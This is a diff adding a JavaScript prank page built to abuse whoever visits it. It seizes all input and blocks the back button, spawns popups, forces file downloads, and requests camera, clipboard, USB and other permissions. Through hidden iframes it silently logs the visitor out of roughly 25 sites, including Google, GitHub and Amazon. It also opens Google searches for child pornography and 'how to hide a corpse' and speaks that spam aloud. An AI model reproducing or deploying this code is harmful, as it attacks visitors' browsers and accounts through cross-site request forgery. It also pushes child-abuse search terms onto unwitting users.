@@ -1,0 +1,964 @@
+const SCREEN_WIDTH = window.screen.width;
+const SCREEN_HEIGHT = window.screen.availHeight;
+const WIN_WIDTH = 480;
+const WIN_HEIGHT = 260;
+const VELOCITY = 15;
+const MARGIN = 10;
+const TOP_MARGIN = 20;
+const TICK_LENGTH = 50;
+const HIDDEN_STYLE = 'position: fixed; width: 1px; height: 1px; top: -10px; left: -10px; overflow: hidden;';
+
+const ART = [
+    'frame1',
+    'frame2'
+];
+
+const SEARCHES = [
+    'cocuk porno',
+    'child porn',
+    'loli hentai',
+    'ceset nasil saklanir',
+    'turk milleti zekidir',
+    'lütfen git'
+];
+
+const VIDEOS = [
+    'nyan.mp4',
+    'cat.mp4',
+    'leak.mp4',
+    'fetu.mp4',
+    'quit.mp4',
+    'dk.mp4',
+    'lollipop.mp4',
+    'orrcun.mp4',
+    'sabir.mp4',
+    'ewew.mp4',
+    'ritual.mp4',
+    'dual-rumble.mp4'
+];
+
+const FILE_DOWNLOADS = [
+    'abo.png',
+    'nice.png',
+    'ren.png',
+    'ha.jpg',
+    'ra.jpg',
+    'haram.png',
+    'sa.jpg',
+    'ero.png'
+];
+
+const PHRASES = [
+    'hacked',
+    'That was a mistake',
+    'asd asd asd asd asd',
+    'qwe qwe qwe qwe qwe',
+    'cocuk porno',
+    'aaaaaaaaaa',
+    'skibidi skibidi toilet',
+    'sigma skibidi sigma',
+    'eyo eyo eyo eyo eyo',
+    'hee haw hee haw hee haw hee haw hee haw'
+];
+
+const LOGOUT_SITES = {
+    'Discord': [
+        'GET',
+        'https://discord.com/api/v9/auth/logout',
+        { provider: null, voip_provider: null }
+    ],
+    'Amazon': [
+        'GET',
+        'https://www.amazon.com/gp/flex/sign-out.html?action=sign-out'
+    ],
+    'DeviantART': [
+        'GET',
+        'https://www.deviantart.com/users/logout'
+    ],
+    'DreamHost': [
+        'GET',
+        'https://panel.dreamhost.com/index.cgi?Nsp=sign-out'
+    ],
+    'Dropbox': [
+        'GET',
+        'https://www.dropbox.com/logout'
+    ],
+    'eBay': [
+        'GET',
+        'https://signin.ebay.com/ws/eBayISAPI.dll?SignIn'
+    ],
+    'GitHub': [
+        'GET',
+        'https://github.com/logout'
+    ],
+    'GMail': [
+        'GET',
+        'https://mail.google.com/mail/?logout'
+    ],
+    'Google': [
+        'GET',
+        'https://www.google.com/accounts/Logout'
+    ],
+    'Yutub': [
+        'GET',
+        'https://www.youtube.com/logout'
+    ],
+    'Yutub1': [
+        'GET',
+        'https://accounts.google.com/Logout?continue=https%3A%2F%2Fwww.youtube.com%2Fsignout%3Faction_logout%3D1'
+    ],
+    'Yutub2': [
+        'GET',
+        'https://accounts.google.com/Logout?service=youtube&continue=https://www.youtube.com/'
+    ],
+    'NetFlix': [
+        'GET',
+        'https://www.netflix.com/SignOut?lnkctr=mL'
+    ],
+    'New York Times': [
+        'GET',
+        'https://www.nytimes.com/logout'
+    ],
+    'Skype': [
+        'GET',
+        'https://secure.skype.com/account/logout'
+    ],
+    'SoundCloud': [
+        'GET',
+        'https://soundcloud.com/logout'
+    ],
+    'Steam Community': [
+        'GET',
+        'https://steamcommunity.com/login/logout/'
+    ],
+    'Steam Store': [
+        'GET',
+        'https://store.steampowered.com/logout/'
+    ],
+    'Tumblr': [
+        'GET',
+        'https://www.tumblr.com/logout'
+    ],
+    'Vimeo': [
+        'GET',
+        'https://vimeo.com/log_out'
+    ],
+    'Wikipedia': [
+        'GET',
+        'https://en.wikipedia.org/w/index.cgi?title=Special:UserLogout'
+    ],
+    'Windows Live': [
+        'GET',
+        'https://login.live.com/logout.srf'
+    ],
+    'Wordpress': [
+        'GET',
+        'https://wordpress.com/wp-login.php?action=logout'
+    ],
+    'Yahoo': [
+        'GET',
+        'https://login.yahoo.com/config/login?.src=fpctx&logout=1&.direct=1&.done=http://www.yahoo.com'
+    ],
+    'YouTube': [
+        'GET',
+        'https://www.youtube.com/logout',
+        { action_logout: '1' }
+    ]
+};
+
+const wins = [];
+let interactionCount = 0;
+let numSuperLogoutIframes = 0;
+
+const isChildWindow = (window.opener && isParentSameOrigin()) || 
+                      (window.location.search.indexOf('child=true') !== -1);
+const isParentWindow = !isChildWindow;
+
+// star repo for more
+init();
+
+if (isChildWindow) {
+    initChildWindow();
+} else {
+    initParentWindow();
+}
+
+function init() {
+    confirmPageUnload();
+    interceptUserInput(event => {
+        interactionCount += 1;
+        event.preventDefault();
+        event.stopPropagation();
+        
+        if (event.which === 2) {
+            openWindow();
+        }
+        
+        startVibrateInterval();
+        enablePictureInPicture();
+        triggerFileDownload();
+        focusWindows();
+        copySpamToClipboard();
+        speak();
+        startTheramin();
+        
+        if (event.which === 17 || event.which === 91) { // made by lelouch
+            window.print();
+            requestWebauthnAttestation();
+            window.print();
+            requestWebauthnAttestation();
+            window.print();
+            requestWebauthnAttestation();
+        } else {
+            requestPointerLock();
+            requestFullscreen();
+            requestClipboardRead();
+            requestMidiAccess();
+            requestBluetoothAccess();
+            requestUsbAccess();
+            requestSerialAccess();
+            requestHidAccess();
+            requestCameraAndMic();
+            if (Math.random() < 0.1) {
+                requestWebauthnAttestation();
+            }
+        }
+    });
+}
+
+function initChildWindow() {
+    registerProtocolHandlers();
+    hideCursor();
+    moveWindowBounce();
+    setupFollowWindow();
+    startVideo();
+    detectWindowClose();
+    triggerFileDownload();
+    speak();
+    rainbowThemeColor();
+    animateUrlWithEmojis();
+    
+    interceptUserInput(event => {
+        if (interactionCount === 1) {
+            startAlertInterval();
+        }
+    });
+}
+
+function initParentWindow() {
+    showHelloMessage();
+    blockBackButton();
+    fillHistory();
+    startInvisiblePictureInPictureVideo();
+    
+    interceptUserInput(event => {
+        if (interactionCount === 3) {
+            registerProtocolHandlers();
+            attemptToTakeoverReferrerWindow();
+            hideCursor();
+            startVideo();
+            startAlertInterval();
+            superLogout();
+            removeHelloMessage();
+            rainbowThemeColor();
+            animateUrlWithEmojis();
+            speak('Successful');
+        }
+    });
+}
+
+function attemptToTakeoverReferrerWindow() {
+    if (isParentWindow && window.opener && !isParentSameOrigin()) {
+        window.opener.location = window.location.href + '?child=true';
+    }
+}
+
+function isParentSameOrigin() {
+    try {
+        return window.opener.location.origin === window.location.origin;
+    } catch (e) {
+        return false;
+    }
+}
+
+function confirmPageUnload() {
+    window.addEventListener('beforeunload', event => {
+        speak('onCloseWindow');
+        event.returnValue = true;
+    });
+}
+
+function registerProtocolHandlers() {
+    if (typeof navigator.registerProtocolHandler === 'function') {
+        return;
+    }
+    
+    const protocols = [
+        'web+hacked',
+        'ssh',
+        'im',
+        'irc',
+        'sip',
+        'sms',
+        'smsto',
+        'geo',
+        'news',
+        'nntp',
+        'tel',
+        'webcal',
+        'wtai',
+        'wyciwyg',
+        'xmpp',
+        'bitcoin',
+        'magnet',
+        'mailto'
+    ];
+    
+    const url = window.location.href + '/url=%s';
+    
+    protocols.forEach(protocol => {
+        navigator.registerProtocolHandler(protocol, url, 'hacked');
+    });
+}
+
+function requestCameraAndMic() {
+    if (!navigator.mediaDevices || 
+        typeof navigator.mediaDevices.enumerateDevices !== 'function') {
+        return;
+    }
+    
+    navigator.mediaDevices.enumerateDevices().then(devices => {
+        const videoInputs = devices.filter(device => device.kind === 'videoinput');
+        
+        if (videoInputs.length === 0) return;
+        
+        const lastCamera = videoInputs[videoInputs.length - 1];
+        
+        navigator.mediaDevices.getUserMedia({
+            deviceId: lastCamera.deviceId,
+            facingMode: ['user', 'environment'],
+            audio: true,
+            video: true
+        }).then(stream => {
+            const videoTrack = stream.getVideoTracks()[0];
+            const imageCapture = new window.ImageCapture(videoTrack);
+            
+            imageCapture.getPhotoCapabilities().then(() => {
+                videoTrack.applyConstraints({
+                    advanced: [{ torch: true }]
+                });
+            }, () => {});
+        }, () => {});
+    });
+}
+
+function animateUrlWithEmojis() {
+    if (window.hacked) return;
+    
+    const randomType = Math.random();
+    
+    if (randomType < 0.33) {
+        babyEmojiAnimation();
+    } else if (randomType < 0.67) {
+        randomCharAnimation();
+    } else {
+        moonPhaseAnimation();
+    }
+    
+    function babyEmojiAnimation() {
+        const skinTones = ['🏻', '🏼', '🏽', '🏾', '🏿'];
+        
+        setInterval(() => {
+            let result = '';
+            for (let i = 0; i < 10; i++) {
+                const toneIndex = Math.floor(
+                    Math.abs(Math.sin((Date.now() / 1000) + i)) * 5
+                );
+                result += '👶' + skinTones[toneIndex];
+            }
+            window.location.hash = result;
+        }, 100);
+    }
+    
+    function randomCharAnimation() {
+        setInterval(() => {
+            let result = '';
+            for (let i = 0; i < 20; i++) {
+                const charCode = Math.floor(
+                    Math.abs(Math.sin((Date.now() / 1000) + (i / 2))) * 94
+                ) + 33;
+                result += String.fromCharCode(charCode);
+            }
+            window.location.hash = result;
+        }, 100);
+    }
+    
+    function moonPhaseAnimation() {
+        const moons = ['🌑', '🌘', '🌗', '🌖', '🌕', '🌔', '🌓', '🌒'];
+        const positions = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0];
+        let direction = 0;
+        
+        setInterval(() => {
+            let result = '';
+            let index = 0;
+            
+            if (!direction) {
+                while (positions[index] < 8) {
+                    index++;
+                }
+                if (index >= positions.length) {
+                    direction = 1;
+                } else {
+                    positions[index]++;
+                }
+            } else {
+                while (positions[index] > 0) {
+                    index++;
+                }
+                if (index >= positions.length) {
+                    direction = 0;
+                } else {
+                    positions[index]++;
+                    if (positions[index] > 7) {
+                        positions[index] = 0;
+                    }
+                }
+            }
+            
+            positions.forEach(position => {
+                result += moons[position];
+            });
+            
+            window.location.hash = result;
+        }, 100);
+    }
+}
+
+function requestPointerLock() {
+    const requestPointerLock = 
+        document.body.requestPointerLock ||
+        document.body.mozRequestPointerLock ||
+        document.body.webkitRequestPointerLock ||
+        document.body.msRequestPointerLock;
+    
+    requestPointerLock.call(document.body);
+}
+
+function startVibrateInterval() {
+    if (typeof window.navigator.vibrate !== 'function') {
+        return;
+    }
+    
+    setInterval(() => {
+        const duration = Math.floor(Math.random() * 600);
+        window.navigator.vibrate(duration);
+    }, 1000);
+    
+    window.addEventListener('gamepadconnected', event => {
+        const gamepad = event.gamepad;
+        
+        if (gamepad.vibrationActuator) {
+            setInterval(() => {
+                if (gamepad.connected && gamepad.vibrationActuator) {
+                    gamepad.vibrationActuator.playEffect('dual-rumble', {
+                        duration: Math.floor(Math.random() * 600),
+                        strongMagnitude: Math.random(),
+                        weakMagnitude: Math.random()
+                    });
+                }
+            }, 1000);
+        }
+    });
+}
+
+function interceptUserInput(callback) {
+    document.body.addEventListener('click', callback, { passive: false });
+    document.body.addEventListener('keydown', callback);
+    document.body.addEventListener('keypress', callback);
+    document.body.addEventListener('keyup', callback);
+    document.body.addEventListener('mousedown', callback);
+    document.body.addEventListener('mouseup', callback);
+    document.body.addEventListener('touchstart', callback);
+}
+
+function startInvisiblePictureInPictureVideo() {
+    const video = document.createElement('video');
+    video.src = getRandomArrayEntry(VIDEOS);
+    video.autoplay = true;
+    video.loop = true;
+    video.style = HIDDEN_STYLE;
+    video.muted = true;
+    video.play();
+    document.body.appendChild(video);
+}
+
+function enablePictureInPicture() {
+    const video = document.querySelector('video');
+    
+    if (document.pictureInPictureEnabled) {
+        video.src = '';
+        video.muted = false;
+        video.play();
+        video.requestPictureInPicture();
+    }
+}
+
+function focusWindows() {
+    wins.forEach(win => {
+        if (!win.closed) {
+            win.focus();
+        }
+    });
+}
+
+function openWindow() {
+    const { x, y } = getRandomCoords();
+    const features = `width=${WIN_WIDTH},height=${WIN_HEIGHT},top=${y},left=${x}`;
+    const newWin = window.open(window.location.href, '', features);
+    
+    if (!newWin) return;
+    
+    wins.push(newWin);
+    
+    if (wins.length === 2) {
+        setupSearchWindow(newWin);
+    }
+}
+
+function hideCursor() {
+    document.querySelector('html').style = 'cursor: none;';
+}
+
+function triggerFileDownload() {
+    const fileName = getRandomArrayEntry(FILE_DOWNLOADS);
+    const link = document.createElement('a');
+    link.href = fileName;
+    link.download = fileName;
+    link.click();
+}
+
+function speak(text) {
+    if (text == null) {
+        text = getRandomArrayEntry(PHRASES);
+    }
+    
+    window.speechSynthesis.speak(
+        new window.SpeechSynthesisUtterance(text)
+    );
+}
+
+function startTheramin() {
+    const audioContext = new AudioContext();
+    const oscillator = audioContext.createOscillator();
+    const gainNode = audioContext.createGain();
+    const minFreq = 200;
+    const maxFreq = 800;
+    
+    const wave = audioContext.createPeriodicWave(
+        Array(10).fill(0).map((_, i) => Math.cos(i)),
+        Array(10).fill(0).map((_, i) => Math.sin(i))
+    );
+    
+    oscillator.setPeriodicWave(wave);
+    oscillator.connect(gainNode);
+    gainNode.connect(audioContext.destination);
+    oscillator.start(0);
+    
+    const updateAudio = ({ pitch, volume }) => {
+        oscillator.frequency.value = minFreq + (pitch * maxFreq);
+        gainNode.gain.value = (volume * 0.5);
+    };
+    
+    document.body.addEventListener('mousemove', event => {
+        const { clientX, clientY } = event;
+        const { clientWidth, clientHeight } = document.body;
+        
+        const pitch = (clientX - (clientWidth / 2)) / clientWidth;
+        const volume = (clientY - (clientHeight / 2)) / clientHeight;
+        
+        updateAudio({ pitch, volume });
+    });
+}
+
+function requestClipboardRead() {
+    try {
+        navigator.clipboard.readText().then(text => {
+            if (!window.hacked) {
+                window.alert('clipboard: \'' + text + '\'');
+            }
+        }, () => {});
+    } catch {}
+}
+
+function requestWebauthnAttestation() {
+    try {
+        const publicKeyCredentialCreationOptions = {
+            publicKey: {
+                rp: { name: 'Acme' },
+                user: {
+                    id: new Uint8Array(16),
+                    name: 'ren@erenzy.dev',
+                    displayName: 'ren@erenzy.dev'
+                },
+                pubKeyCredParams: [{
+                    type: 'public-key',
+                    alg: -7
+                }],
+                attestation: 'direct',
+                timeout: 60000,
+                challenge: new Uint8Array([
+                    0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15,
+                    16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31
+                ]).buffer
+            }
+        };
+        
+        const publicKeyCredentialRequestOptions = {
+            publicKey: {
+                timeout: 60000,
+                challenge: new Uint8Array([
+                    32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47,
+                    48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63
+                ]).buffer
+            }
+        };
+        
+        navigator.credentials.create(publicKeyCredentialCreationOptions)
+            .then(credential => {
+                const allowCredentials = [{
+                    id: credential.rawId,
+                    transports: ['usb', 'nfc', 'ble'],
+                    type: 'public-key'
+                }];
+                
+                publicKeyCredentialRequestOptions.publicKey.allowCredentials = allowCredentials;
+                
+                return navigator.credentials.get(publicKeyCredentialRequestOptions);
+            });
+    } catch {}
+}
+
+function requestMidiAccess() {
+    try {
+        navigator.requestMIDIAccess({ sysex: true });
+    } catch {}
+}
+
+function requestBluetoothAccess() {
+    try {
+        navigator.bluetooth.requestDevice({
+            acceptAllDevices: true
+        }).then(device => device.gatt.connect());
+    } catch {}
+}
+
+function requestUsbAccess() {
+    try {
+        navigator.usb.requestDevice({ filters: [{}] });
+    } catch {}
+}
+
+function requestSerialAccess() {
+    try {
+        navigator.serial.requestPort({ filters: [] });
+    } catch {}
+}
+
+function requestHidAccess() {
+    try {
+        navigator.hid.requestDevice({ filters: [] });
+    } catch {}
+}
+
+function moveWindowBounce() {
+    let velX = VELOCITY * (Math.random() > 0.5 ? 1 : -1);
+    let velY = VELOCITY * (Math.random() > 0.5 ? 1 : -1);
+    
+    setInterval(() => {
+        const x = window.screenX;
+        const y = window.screenY;
+        const width = window.outerWidth;
+        const height = window.outerHeight;
+        
+        if (x < MARGIN) velX = Math.abs(velX);
+        if (x + width > SCREEN_WIDTH - MARGIN) velX = -Math.abs(velX);
+        if (y < TOP_MARGIN) velY = Math.abs(velY);
+        if (y + height > SCREEN_HEIGHT - MARGIN) velY = -Math.abs(velY);
+        
+        window.moveBy(velX, velY);
+    }, TICK_LENGTH);
+}
+
+function setupFollowWindow() {
+    document.addEventListener('mousemove', function(event) {
+        window.moveTo(
+            event.screenX - (WIN_WIDTH / 2),
+            event.screenY - (WIN_HEIGHT / 2)
+        );
+    });
+}
+
+function startVideo() {
+    const video = document.createElement('video');
+    video.src = getRandomArrayEntry(VIDEOS);
+    video.autoplay = true;
+    video.loop = true;
+    video.style = HIDDEN_STYLE;
+    document.body.appendChild(video);
+}
+
+function detectWindowClose() {
+    window.addEventListener('unload', () => {
+        if (!window.opener.closed) {
+            window.opener.onCloseWindow(window);
+        }
+    });
+}
+
+function onCloseWindow(win) {
+    const index = wins.indexOf(win);
+    if (index >= 0) {
+        wins.splice(index, 1);
+    }
+}
+
+function showHelloMessage() {
+    const template = document.querySelector('template.hello-message');
+    const clone = document.importNode(template.content, true);
+    document.body.appendChild(clone);
+}
+
+function removeHelloMessage() {
+    const message = document.querySelector('.hello-message');
+    message.remove();
+}
+
+function rainbowThemeColor() {
+    function pad(num, str, char = '0') {
+        num -= str.toString().length;
+        if (num > 0) {
+            return new Array(num + (/\./.test(str) ? 2 : 1)).join(char) + str;
+        }
+        return str + '';
+    }
+    
+    const meta = document.querySelector('meta.theme-color');
+    
+    setInterval(() => {
+        meta.setAttribute(
+            'content',
+            '#' + pad(6, Math.floor(Math.random() * 0xFFFFFF).toString(16))
+        );
+    }, 100);
+}
+
+function copySpamToClipboard() {
+    const spam = getRandomArrayEntry(ART) + '\n';
+    clipboardCopy(spam);
+}
+
+function clipboardCopy(text) {
+    const textarea = document.createElement('textarea');
+    textarea.value = text;
+    textarea.style.position = 'fixed';
+    
+    const body = document.createElement('body');
+    body.style = '';
+    document.body.appendChild(body);
+    
+    let selection = body.contentWindow;
+    if (!selection) {
+        selection = window;
+    }
+    
+    const range = selection.document.createRange();
+    selection.removeAllRanges();
+    range.selectNode(textarea);
+    selection.addRange(range);
+    
+    let success = false;
+    try {
+        success = selection.document.execCommand('copy');
+    } catch (e) {
+        console.log(e);
+    }
+    
+    selection.removeAllRanges();
+    textarea.remove();
+    body.remove();
+    
+    return success;
+}
+
+function startAlertInterval() {
+    setInterval(() => {
+        if (Math.random() < 0.5) {
+            showAlert();
+        } else {
+            window.print();
+        }
+    }, 5000);
+}
+
+function showAlert() {
+    const art = getRandomArrayEntry(ART);
+    const alerts = Array(100).fill(art);
+    window.alert(alerts);
+}
+
+function requestFullscreen() {
+    const requestFullscreen =
+        Element.prototype.requestFullscreen ||
+        Element.prototype.mozRequestFullScreen ||
+        Element.prototype.webkitRequestFullscreen ||
+        Element.prototype.msRequestFullscreen;
+    
+    requestFullscreen.call(document.body);
+}
+
+function superLogout() {
+    function removeIframe(iframe, force) {
+        if (force) {
+            force = false;
+            return;
+        }
+        iframe.parentNode.removeChild(iframe);
+    }
+    
+    function createHiddenIframe(url) {
+        const iframe = document.createElement('iframe');
+        iframe.onload = () => removeIframe(iframe);
+        iframe.onerror = () => removeIframe(iframe);
+        iframe.style = HIDDEN_STYLE;
+        document.body.appendChild(iframe);
+        iframe.src = url;
+    }
+    
+    function createHiddenForm(url, params) {
+        const iframe = document.createElement('iframe');
+        iframe.style = HIDDEN_STYLE;
+        iframe.name = 'iframe' + numSuperLogoutIframes;
+        document.body.appendChild(iframe);
+        numSuperLogoutIframes += 1;
+        
+        const form = document.createElement('form');
+        form.style = HIDDEN_STYLE;
+        
+        let frameLoaded = 0;
+        iframe.onload = iframe.onerror = () => {
+            if (frameLoaded >= 2) {
+                removeIframe(iframe);
+            }
+            frameLoaded += 1;
+        };
+        
+        form.action = url;
+        form.method = 'POST';
+        form.target = iframe.name;
+        
+        for (const key in params) {
+            if (Object.prototype.hasOwnProperty.call(params, key)) {
+                const input = document.createElement('input');
+                input.type = 'hidden';
+                input.name = key;
+                input.value = params[key];
+                form.appendChild(input);
+            }
+        }
+        
+        document.body.appendChild(form);
+        form.submit();
+    }
+    
+    for (const site in LOGOUT_SITES) {
+        const method = LOGOUT_SITES[site][0];
+        const url = LOGOUT_SITES[site][1];
+        const params = LOGOUT_SITES[site][2] || {};
+        
+        if (method === 'GET') {
+            createHiddenIframe(url);
+        } else {
+            createHiddenForm(url, params);
+        }
+    }
+}
+
+function blockBackButton() {
+    window.addEventListener('popstate', () => {
+        window.history.forward();
+    });
+}
+
+function fillHistory() {
+    for (let i = 0; i < 100; i++) {
+        window.history.pushState({}, '', window.location.pathname + '?q=' + i);
+    }
+    window.history.pushState({}, '', window.location.pathname);
+}
+
+function getRandomCoords() {
+    const x = MARGIN + Math.floor(
+        Math.random() * ((SCREEN_WIDTH - WIN_WIDTH) - MARGIN)
+    );
+    const y = TOP_MARGIN + Math.floor(
+        Math.random() * ((SCREEN_HEIGHT - WIN_HEIGHT) - TOP_MARGIN)
+    );
+    
+    return { x, y };
+}
+
+function getRandomArrayEntry(array) {
+    return array[Math.floor(Math.random() * array.length)];
+}
+
+function setupSearchWindow(win) {
+    if (!win) return;
+    
+    const { x, y } = getRandomCoords();
+    win.moveTo(x, y);
+    win.resizeTo(WIN_WIDTH * 2, WIN_HEIGHT * 2);
+    win.location.href = 'https://www.google.com/search?igu=1&q=' + 
+                        encodeURIComponent(SEARCHES[0]);
+    
+    let searchIndex = 1;
+    
+    const interval = setInterval(() => {
+        if (win.closed) {
+            clearInterval(interval);
+            onCloseWindow(win);
+            return;
+        }
+        
+        win.location.hash = window.location.hash;
+        
+        setTimeout(() => {
+            win.resizeTo(WIN_WIDTH, WIN_HEIGHT);
+        }, 1000);
+        
+        setTimeout(() => {
+            const { x, y } = getRandomCoords();
+            win.moveTo(x, y);
+            win.resizeTo(WIN_WIDTH * 2, WIN_HEIGHT * 2);
+            win.location.href = 'https://www.google.com/search?igu=1&q=' + 
+                                encodeURIComponent(SEARCHES[searchIndex]);
+            
+            searchIndex += 1;
+            if (searchIndex >= SEARCHES.length) {
+                searchIndex = 0;
+            }
+        }, 3000);
+    }, 10000);
+}
+
+function detectBrowser() {
+    const userAgent = navigator.userAgent;
+    
+    if (/samsungbrowser\//i.test(userAgent)) return 'samsung';
+    if (/edg\//i.test(userAgent)) return 'edge';
+    if (/edga\//i.test(userAgent)) return 'edge';
+    if (/opt\//i.test(userAgent)) return 'opera';
+    if (/opr\//i.test(userAgent)) return 'opera';
+    if (/chrome\//i.test(userAgent)) return 'chrome';
+    if (/safari\//i.test(userAgent)) return 'safari';
+    if (/firefox\//i.test(userAgent)) return 'firefox';
+}
